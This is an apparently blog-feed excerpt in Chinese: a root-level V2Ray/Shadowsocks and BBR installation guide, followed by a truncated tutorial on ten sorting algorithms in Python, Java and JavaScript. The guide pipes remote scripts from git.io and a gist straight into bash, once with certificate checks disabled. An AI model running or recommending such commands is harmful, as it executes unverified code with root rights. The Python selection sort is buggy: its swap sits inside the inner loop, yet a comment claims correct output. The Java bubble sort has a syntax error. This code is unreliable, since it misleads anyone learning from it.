        <content type="html"><![CDATA[<h3 id="一、V2Ray-SS"><a href="#一、V2Ray-SS" class="headerlink" title="一、V2Ray+SS"></a>一、V2Ray+SS</h3><h4 id="1、系统要求"><a href="#1、系统要求" class="headerlink" title="1、系统要求"></a>1、系统要求</h4><p>CentOS7、Ubuntu16、Ubuntu14、Debian9</p><h4 id="2、切换root权限"><a href="#2、切换root权限" class="headerlink" title="2、切换root权限"></a>2、切换root权限</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo -i</span><br></pre></td></tr></table></figure><h4 id="3、一键安装脚本"><a href="#3、一键安装脚本" class="headerlink" title="3、一键安装脚本"></a>3、一键安装脚本</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bash &lt;(curl -s -L https://git.io/v2ray.sh)</span><br></pre></td></tr></table></figure><h4 id="4、如果提示curl-command-not-found，请安装Curl"><a href="#4、如果提示curl-command-not-found，请安装Curl" class="headerlink" title="4、如果提示curl: command not found，请安装Curl"></a>4、如果提示curl: command not found，请安装Curl</h4><ul><li>Ubuntu&#x2F;Debian系统安装Curl方法:</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get install -y curl</span><br></pre></td></tr></table></figure><ul><li>CentOS系统安装Curl方法:</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install -y curl</span><br></pre></td></tr></table></figure><h4 id="5、安装步骤"><a href="#5、安装步骤" class="headerlink" title="5、安装步骤"></a>5、安装步骤</h4><ol><li><p>根据提示输入序号进行安装。</p></li><li><p>协议很多，可以搜索了解下，也可以直接用默认的。有的需要有域名（websocket tls），有的就不用（tcp，mkcp）。</p></li><li><p>端口号随意，为了避免冲突，推荐使用1000以上的端口号（不能超过65535）。</p></li><li><p>广告拦截，会增加服务器负担，不建议开启。</p></li><li><p>开启SS，按需使用。</p></li><li><p>SS端口号随意，不要和V2ray的端口号冲突。</p></li><li><p>SS连接密码，没有要求，越简单越好。</p></li><li><p>SS加密协议，按需选择。</p></li><li><p>搭建完成，回车，回车。</p></li></ol><h4 id="6、配置及管理"><a href="#6、配置及管理" class="headerlink" title="6、配置及管理"></a>6、配置及管理</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">V2Ray配置文件路径</span></span><br><span class="line">/etc/v2ray/config.json</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看V2Ray配置信息</span></span><br><span class="line">v2ray info</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改V2Ray配置</span></span><br><span class="line">v2ray config</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">生成V2Ray配置文件链接</span></span><br><span class="line">v2ray link</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">生成V2Ray配置信息链接</span></span><br><span class="line">v2ray infolink</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">生成V2Ray配置二维码链接</span></span><br><span class="line">v2ray qr</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改Shadowsocks配置</span></span><br><span class="line">v2ray ss</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看Shadowsocks配置信息</span></span><br><span class="line">v2ray ssinfo</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">生成Shadowsocks配置二维码链接</span></span><br><span class="line">v2ray ssqr</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看V2Ray运行状态</span></span><br><span class="line">v2ray status</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动V2Ray</span></span><br><span class="line">v2ray start</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">停止V2Ray</span></span><br><span class="line">v2ray stop</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重启V2Ray</span></span><br><span class="line">v2ray restart</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看V2Ray运行日志</span></span><br><span class="line">v2ray log</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">更新V2Ray</span></span><br><span class="line">v2ray update</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">更新V2Ray管理脚本</span></span><br><span class="line">v2ray update.sh</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">卸载V2Ray</span></span><br><span class="line">v2ray uninstall</span><br></pre></td></tr></table></figure><h4 id="7、彻底卸载"><a href="#7、彻底卸载" class="headerlink" title="7、彻底卸载"></a>7、彻底卸载</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">停用并卸载服务</span></span><br><span class="line">systemctl stop v2ray</span><br><span class="line">systemctl disable v2ray</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除文件</span></span><br><span class="line">rm -rf /etc/v2ray/* # 配置文件</span><br><span class="line">rm -rf /usr/bin/v2ray/* # 程序</span><br><span class="line">rm -rf /var/log/v2ray/* # 日志</span><br><span class="line">rm -rf /etc/systemd/system/v2ray* # 服务项</span><br><span class="line">rm -rf /lib/systemd/system/v2ray.service # 启动项</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重新载入服务</span></span><br><span class="line">systemctl daemon-reload</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">放弃失效服务</span></span><br><span class="line">systemctl reset-failed</span><br></pre></td></tr></table></figure><h3 id="二、BBR-锐速"><a href="#二、BBR-锐速" class="headerlink" title="二、BBR&#x2F;锐速"></a>二、BBR&#x2F;锐速</h3><h4 id="1、注意事项"><a href="#1、注意事项" class="headerlink" title="1、注意事项"></a>1、注意事项</h4><ul><li><p>BBR是Google提出的一种新型拥塞控制算法,可以使Linux服务器显著地提高吞吐量和减少TCP连接的延迟。</p></li><li><p>安装锐速需要降级系统内核，而安装Google BBR则需要升级系统内核，故两者不能同时安装。</p></li><li><p>安装锐速需要降级系统内核，有可能造成系统不稳定，故不建议将其应用在重要的生产环境中。</p></li><li><p>本教程适用于Centos6+&#x2F;Debian7+&#x2F;Ubuntu14+系统，BBR魔改版不支持Debian8。</p></li></ul><h4 id="2、安装"><a href="#2、安装" class="headerlink" title="2、安装"></a>2、安装</h4><ul><li><p>下面是一个五合一的TCP网络加速脚本，其包括了BBR原版、BBR魔改版、暴力BBR魔改版、BBR plus、Lotsever(锐速)安装脚本。该脚本由94ish.me制作。</p></li><li><p>按照脚本菜单选项，选择对应安装的功能，来启用加速。</p></li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget -N --no-check-certificate &quot;https://gist.github.com/zeruns/a0ec603f20d1b86de6a774a8ba27588f/raw/4f9957ae23f5efb2bb7c57a198ae2cffebfb1c56/tcp.sh&quot; &amp;&amp; chmod +x tcp.sh &amp;&amp; ./tcp.sh</span><br></pre></td></tr></table></figure><h4 id="3、锐速管理命令"><a href="#3、锐速管理命令" class="headerlink" title="3、锐速管理命令"></a>3、锐速管理命令</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看运行状态</span></span><br><span class="line">/appex/bin/serverSpeeder.sh status</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动锐速</span></span><br><span class="line">/appex/bin/serverSpeeder.sh start</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">停止锐速</span></span><br><span class="line">/appex/bin/serverSpeeder.sh stop</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重启锐速</span></span><br><span class="line">/appex/bin/serverSpeeder.sh restart</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">卸载锐速</span></span><br><span class="line">/appex/bin/serverSpeeder.sh uninstall</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No79：十大经典排序算法</title>
      <link href="/posts/827ca9cd.html"/>
      <url>/posts/827ca9cd.html</url>
      
        <content type="html"><![CDATA[<h3 id="0、算法概述"><a href="#0、算法概述" class="headerlink" title="0、算法概述"></a>0、算法概述</h3><h4 id="0-1-算法分类"><a href="#0-1-算法分类" class="headerlink" title="0.1 算法分类"></a>0.1 算法分类</h4><p>十种常见排序算法可以分为两大类：</p><ul><li><p>比较类排序：通过比较来决定元素间的相对次序，由于其时间复杂度不能突破O(nlogn)，因此也称为非线性时间比较类排序。</p></li><li><p>非比较类排序：不通过比较来决定元素间的相对次序，它可以突破基于比较排序的时间下界，以线性时间运行，因此也称为线性时间非比较类排序。</p></li></ul><p><img src="/posts/827ca9cd/%E5%8D%81%E5%A4%A7%E7%BB%8F%E5%85%B8%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95_%E7%AE%97%E6%B3%95%E5%88%86%E7%B1%BB.jpg" alt="算法分类" title="算法分类"></p><h4 id="0-2-算法复杂度"><a href="#0-2-算法复杂度" class="headerlink" title="0.2 算法复杂度"></a>0.2 算法复杂度</h4><p><img src="/posts/827ca9cd/%E5%8D%81%E5%A4%A7%E7%BB%8F%E5%85%B8%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95_%E7%AE%97%E6%B3%95%E5%A4%8D%E6%9D%82%E5%BA%A6.jpg" alt="算法复杂度" title="算法复杂度"></p><h4 id="0-3-相关概念"><a href="#0-3-相关概念" class="headerlink" title="0.3 相关概念"></a>0.3 相关概念</h4><ul><li><p>稳定排序：如果a原本在b的前面，且a&#x3D;&#x3D;b，排序之后a仍然在b的前面，则为稳定排序。</p></li><li><p>非稳定排序：如果a原本在b的前面，且a&#x3D;&#x3D;b，排序之后a可能不在b的前面，则为非稳定排序。</p></li><li><p>原地排序：原地排序就是指在排序过程中不申请多余的存储空间，只利用原来存储待排数据的存储空间进行比较和交换的数据排序。</p></li><li><p>非原地排序：需要利用额外的数组来辅助排序。</p></li><li><p>时间复杂度：一个算法执行所消耗的时间。对排序数据的总的操作次数。反映当n变化时，操作次数呈现什么规律。</p></li><li><p>空间复杂度：运行完一个算法所需的内存大小。是指算法在计算机内执行时所需存储空间的度量，它也是数据规模n的函数。</p></li></ul><h3 id="1、冒泡排序（Bubble-Sort）"><a href="#1、冒泡排序（Bubble-Sort）" class="headerlink" title="1、冒泡排序（Bubble Sort）"></a>1、冒泡排序（Bubble Sort）</h3><p>冒泡排序是一种简单的排序算法。它重复地走访过要排序的数列，一次比较两个元素，如果它们的顺序错误就把它们交换过来。</p><p>走访数列的工作是重复地进行直到没有再需要交换，也就是说该数列已经排序完成。这个算法的名字由来是因为越小的元素会经由交换慢慢“浮”到数列的顶端。</p><h4 id="1-1-算法描述"><a href="#1-1-算法描述" class="headerlink" title="1.1 算法描述"></a>1.1 算法描述</h4><ol><li><p>比较相邻的元素。如果第一个比第二个大，就交换它们两个；</p></li><li><p>对每一对相邻元素作同样的工作，从开始第一对到结尾的最后一对，这样在最后的元素应该会是最大的数；</p></li><li><p>针对所有的元素重复以上的步骤，除了最后一个；</p></li><li><p>重复步骤1~3，直到排序完成。</p></li></ol><h4 id="1-2-动图演示"><a href="#1-2-动图演示" class="headerlink" title="1.2 动图演示"></a>1.2 动图演示</h4><p><img src="/posts/827ca9cd/%E5%8D%81%E5%A4%A7%E7%BB%8F%E5%85%B8%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95_%E5%86%92%E6%B3%A1%E6%8E%92%E5%BA%8F.gif" alt="冒泡排序" title="冒泡排序"></p><h4 id="1-3-算法分析"><a href="#1-3-算法分析" class="headerlink" title="1.3 算法分析"></a>1.3 算法分析</h4><ul><li><p>时间复杂度：O(n2)</p></li><li><p>空间复杂度：O(1)</p></li><li><p>稳定排序</p></li><li><p>原地排序</p></li></ul><h4 id="1-4-代码实现"><a href="#1-4-代码实现" class="headerlink" title="1.4 代码实现"></a>1.4 代码实现</h4><ul><li>Python</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">bubble_sort</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    :param data: list</span></span><br><span class="line"><span class="string">    :return: sorted data</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    length = <span class="built_in">len</span>(data)</span><br><span class="line">    <span class="keyword">if</span> length &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length - <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(length - <span class="number">1</span> - i):</span><br><span class="line">            <span class="keyword">if</span> data[j + <span class="number">1</span>] &lt; data[j]:</span><br><span class="line">                data[j], data[j + <span class="number">1</span>] = data[j + <span class="number">1</span>], data[j]</span><br><span class="line">        <span class="comment"># print(data)</span></span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 原始乱序</span></span><br><span class="line">    d0 = [<span class="number">2</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">64</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">54</span>, <span class="number">45</span>, <span class="number">4</span>, <span class="number">44</span>]</span><br><span class="line">    d1 = bubble_sort(d0)</span><br><span class="line">    <span class="built_in">print</span>(d1)</span><br><span class="line">    <span class="comment"># 正确排序</span></span><br><span class="line">    <span class="comment"># [2, 2, 2, 3, 4, 4, 4, 4, 5, 5, 5, 6, 6, 7, 9, 12, 15, 44, 45, 54, 64]</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>Java</li></ul><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BubbleSort</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span>[] bubbleSort(<span class="type">int</span>[] arr) &#123;</span><br><span class="line">        <span class="keyword">if</span> (arr == <span class="literal">null</span> || arr.length &lt; <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> arr;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> arr.length;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; n -i - <span class="number">1</span>; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (arr[j + <span class="number">1</span>] &lt; arr[j]) &#123;</span><br><span class="line">                    <span class="type">int</span> <span class="variable">t</span> <span class="operator">=</span> arr[j];</span><br><span class="line">                    arr[j] = arr[j+<span class="number">1</span>];</span><br><span class="line">                    arr[j+<span class="number">1</span>] = t;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> arr;</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><ul><li>JavaScript</li></ul><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">bubbleSort</span>(<span class="params">arr</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> len = arr.<span class="property">length</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; len - <span class="number">1</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; len - <span class="number">1</span> - i; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (arr[j] &gt; arr[j + <span class="number">1</span>]) &#123;       <span class="comment">// 相邻元素两两对比</span></span><br><span class="line">                <span class="keyword">var</span> temp = arr[j + <span class="number">1</span>];       <span class="comment">// 元素交换</span></span><br><span class="line">                arr[j + <span class="number">1</span>] = arr[j];</span><br><span class="line">                arr[j] = temp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2、选择排序（Selection-Sort）"><a href="#2、选择排序（Selection-Sort）" class="headerlink" title="2、选择排序（Selection Sort）"></a>2、选择排序（Selection Sort）</h3><p>选择排序(Selection-sort)是一种简单直观的排序算法。它的工作原理：首先在未排序序列中找到最小（大）元素，存放到排序序列的起始位置，</p><p>然后，再从剩余未排序元素中继续寻找最小（大）元素，然后放到已排序序列的末尾。以此类推，直到所有元素均排序完毕。</p><h4 id="2-1-算法描述"><a href="#2-1-算法描述" class="headerlink" title="2.1 算法描述"></a>2.1 算法描述</h4><p>n个记录的直接选择排序可经过n-1趟直接选择排序得到有序结果。</p><p>具体算法描述如下：</p><ol><li><p>初始状态：无序区为R[1..n]，有序区为空；</p></li><li><p>第i趟排序(i&#x3D;1,2,3…n-1)开始时，当前有序区和无序区分别为R[1..i-1]和R(i..n）。</p></li></ol><p>该趟排序从当前无序区中-选出关键字最小的记录R[k]，将它与无序区的第1个记录R交换，<br>使R[1..i]和R[i+1..n)分别变为记录个数增加1个的新有序区和记录个数减少1个的新无序区；</p><ol start="3"><li>n-1趟结束，数组有序化了。</li></ol><h4 id="2-2-动图演示"><a href="#2-2-动图演示" class="headerlink" title="2.2 动图演示"></a>2.2 动图演示</h4><p><img src="/posts/827ca9cd/%E5%8D%81%E5%A4%A7%E7%BB%8F%E5%85%B8%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95_%E9%80%89%E6%8B%A9%E6%8E%92%E5%BA%8F.gif" alt="选择排序" title="选择排序"></p><h4 id="2-3-算法分析"><a href="#2-3-算法分析" class="headerlink" title="2.3 算法分析"></a>2.3 算法分析</h4><p>表现最稳定的排序算法之一，因为无论什么数据进去都是O(n2)的时间复杂度，所以用到它的时候，数据规模越小越好。</p><p>唯一的好处可能就是不占用额外的内存空间了吧。理论上讲，选择排序可能也是平时排序一般人想到的最多的排序方法了吧。</p><ul><li><p>时间复杂度：O(n2)</p></li><li><p>空间复杂度：O(1)</p></li><li><p>非稳定排序</p></li><li><p>原地排序</p></li></ul><h4 id="2-4-代码实现"><a href="#2-4-代码实现" class="headerlink" title="2.4 代码实现"></a>2.4 代码实现</h4><ul><li>Python</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">select_sort</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    :param data: list</span></span><br><span class="line"><span class="string">    :return: sorted data</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    length = <span class="built_in">len</span>(data)</span><br><span class="line">    <span class="keyword">if</span> length &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length - <span class="number">1</span>):</span><br><span class="line">        <span class="comment"># 最小值的索引</span></span><br><span class="line">        minIndex = i</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i + <span class="number">1</span>, length):</span><br><span class="line">            <span class="comment"># 找到最小值的索引</span></span><br><span class="line">            <span class="keyword">if</span> data[j] &lt; data[minIndex]:</span><br><span class="line">                minIndex = j</span><br><span class="line">            <span class="comment"># 将最小的值放在i处</span></span><br><span class="line">            data[i], data[minIndex] = data[minIndex], data[i]</span><br><span class="line">        <span class="comment"># print(data)</span></span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 原始乱序</span></span><br><span class="line">    d0 = [<span class="number">2</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">64</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">54</span>, <span class="number">45</span>, <span class="number">4</span>, <span class="number">44</span>]</span><br><span class="line">    d1 = select_sort(d0)</span><br><span class="line">    <span class="built_in">print</span>(d1)</span><br><span class="line">    <span class="comment"># 正确排序</span></span><br><span class="line">    <span class="comment"># [2, 2, 2, 3, 4, 4, 4, 4, 5, 5, 5, 6, 6, 7, 9, 12, 15, 44, 45, 54, 64]</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>Java</li></ul><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SelectSort</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span>[] selectSort(<span class="type">int</span>[] a) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> a.length;</span><br><span class="line">       <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n - <span class="number">1</span>; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">min</span> <span class="operator">=</span> i;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> i + <span class="number">1</span>; j &lt; n; j++) &#123;</span><br><span class="line">               <span class="keyword">if</span>(a[min] &gt; a[j]) min = j;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//交换</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> a[i];</span><br><span class="line">            a[i] = a[min];</span><br><span class="line">            a[min] = temp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>JavaScript</li></ul><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">selectionSort</span>(<span class="params">arr</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> len = arr.<span class="property">length</span>;</span><br><span class="line">    <span class="keyword">var</span> minIndex, temp;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; len - <span class="number">1</span>; i++) &#123;</span><br><span class="line">        minIndex = i;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> j = i + <span class="number">1</span>; j &lt; len; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (arr[j] &lt; arr[minIndex]) &#123;    <span class="comment">// 寻找最小的数</span></span><br><span class="line">                minIndex = j;                <span class="comment">// 将最小数的索引保存</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        temp = arr[i];</span><br><span class="line">        arr[i] = arr[minIndex];</span><br><span class="line">        arr[minIndex] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3、插入排序（Insertion-Sort）"><a href="#3、插入排序（Insertion-Sort）" class="headerlink" title="3、插入排序（Insertion Sort）"></a>3、插入排序（Insertion Sort）</h3><p>插入排序（Insertion-Sort）的算法描述是一种简单直观的排序算法。</p><p>它的工作原理是通过构建有序序列，对于未排序数据，在已排序序列中从后向前扫描，找到相应位置并插入。</p><h4 id="3-1-算法描述"><a href="#3-1-算法描述" class="headerlink" title="3.1 算法描述"></a>3.1 算法描述</h4><p>一般来说，插入排序都采用in-place在数组上实现。</p><p>具体算法描述如下：</p><ol><li><p>从第一个元素开始，该元素可以认为已经被排序；</p></li><li><p>取出下一个元素，在已经排序的元素序列中从后向前扫描；</p></li><li><p>如果该元素（已排序）大于新元素，将该元素移到下一位置；</p></li><li><p>重复步骤3，直到找到已排序的元素小于或者等于新元素的位置；</p></li><li><p>将新元素插入到该位置后；</p></li><li><p>重复步骤2~5。</p></li></ol><h4 id="3-2-动图演示"><a href="#3-2-动图演示" class="headerlink" title="3.2 动图演示"></a>3.2 动图演示</h4><p><img src="/posts/827ca9cd/%E5%8D%81%E5%A4%A7%E7%BB%8F%E5%85%B8%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95_%E6%8F%92%E5%85%A5%E6%8E%92%E5%BA%8F.gif" alt="插入排序" title="插入排序"></p><h4 id="3-3-算法分析"><a href="#3-3-算法分析" class="headerlink" title="3.3 算法分析"></a>3.3 算法分析</h4><p>插入排序在实现上，通常采用in-place排序（即只需用到O(1)的额外空间的排序），因而在从后向前扫描过程中，<br>需要反复把已排序元素逐步向后挪位，为最新元素提供插入空间。</p><ul><li><p>时间复杂度：O(n2)</p></li><li><p>空间复杂度：O(1)</p></li><li><p>稳定排序</p></li><li><p>原地排序</p></li></ul><h4 id="3-4-代码实现"><a href="#3-4-代码实现" class="headerlink" title="3.4 代码实现"></a>3.4 代码实现</h4><ul><li>Python</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">insert_sort</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    :param data:list</span></span><br><span class="line"><span class="string">    :return: sorted data</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    length = <span class="built_in">len</span>(data)</span><br><span class="line">    <span class="keyword">if</span> length &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, length - <span class="number">1</span>):</span><br><span class="line">        preIndex = i</span><br><span class="line">        current = data[i + <span class="number">1</span>]</span><br><span class="line">        <span class="keyword">while</span> preIndex &gt;= <span class="number">0</span> <span class="keyword">and</span> current &lt; data[preIndex]:</span><br><span class="line">            <span class="comment"># 增加空间</span></span><br><span class="line">            data[preIndex + <span class="number">1</span>] = data[preIndex]</span><br><span class="line">            preIndex -= <span class="number">1</span></span><br><span class="line">        data[preIndex + <span class="number">1</span>] = current</span><br><span class="line">        <span class="comment"># print(data)</span></span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 原始乱序</span></span><br><span class="line">    d0 = [<span class="number">2</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">64</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">54</span>, <span class="number">45</span>, <span class="number">4</span>, <span class="number">44</span>]</span><br><span class="line">    d1 = insert_sort(d0)</span><br><span class="line">    <span class="built_in">print</span>(d1)</span><br><span class="line">    <span class="comment"># 正确排序</span></span><br><span class="line">    <span class="comment"># [2, 2, 2, 3, 4, 4, 4, 4, 5, 5, 5, 6, 6, 7, 9, 12, 15, 44, 45, 54, 64]</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>Java</li></ul><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InsertSort</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span>[] insertSort(<span class="type">int</span>[] arr) &#123;</span><br><span class="line">        <span class="keyword">if</span>(arr == <span class="literal">null</span> || arr.length &lt; <span class="number">2</span>)</span><br><span class="line">            <span class="keyword">return</span> arr;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> arr.length;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> arr[i];</span><br><span 